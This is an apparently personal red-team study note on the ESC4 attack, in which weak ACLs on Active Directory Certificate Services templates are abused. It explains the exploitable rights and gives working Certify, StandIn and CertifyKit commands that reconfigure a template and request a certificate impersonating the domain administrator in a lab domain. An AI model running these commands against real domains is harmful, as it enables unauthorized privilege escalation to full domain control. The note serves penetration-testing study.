## Vulnerable ACLs (GenericWrite) over AD CS Certificate Templates ##

#### What's running under the hood ####
- Certificate templates are securable objects - they have ACLs.
- They have a **security descriptor** that specifies which AD principals have specific permissions over the template.
- A certificate template that has overly permissive ACLs can be abused to modify security settings of the template to introduce misconfigurations like [[ESC1]].

#### What the attack is about ####
- If an attacker has enough permissions to modify a template and create any of the exploitable misconfigurations from the previous sections, he will be able to exploit it and **escalate privileges**.
- Interesting rights over certificate templates:
	- **Owner:** Implicit full control of the object, can edit any properties.
	- **FullControl:** Full control of the object, can edit any properties.
	- **WriteOwner:** Can modify the owner to an attacker-controlled principal.
	- **WriteDacl**: Can modify access control to grant an attacker FullControl.
	- **WriteProperty:** Can edit any properties

### Enumeration ###
1. **Certify**
`PS C:\ADCS\Auditor> .\Certify.exe find /template`

### Execution ###
1. **StandIn** (only allows adding the Client Authentication EKU for ESC1 abuse)
	- ENROLLEE_SUPPLIES_SUBJECT:
		`PS C:\ADCS\Auditor> .\StandIn_v13_Net45.exe --ADCS --filter SecureUpdate --ess --add`
	- Certificate-Enrollment Permission
		`PS C:\ADCS\Auditor> .\StandIn_v13_Net45.exe --ADCS --filter SecureUpdate --ntaccount "cb\domain users" --enroll --add`
	- Client Authentication EKU
		`PS C:\ADCS\Auditor> .\StandIn_v13_Net45.exe --ADCS --filter SecureUpdate --clientauth --add`
	
	- We can also abuse ESC4 using a few other EKUs other than the Client Authentication EKU.
		- Smart Card Logon (OID: 1.3.6.1.4.1.311.20.2.2)
		- PKINIT Client Authentication (OID: 1.3.6.1.5.2.3.4)
		- Any Purpose (OID: 2.5.29.37.0) – No EKU
2. **CertifyKit**
	- SmartCardLogon
		`PS C:\ADCS\Auditor> .\CertifyKit.exe request /ca:cb-ca.cb.corp\CB-CA /template:'SecureUpdate' /altname:administrator /domain:cb.corp /alter /sidextension:S-1-5-21-2928296033-1822922359-262865665-500`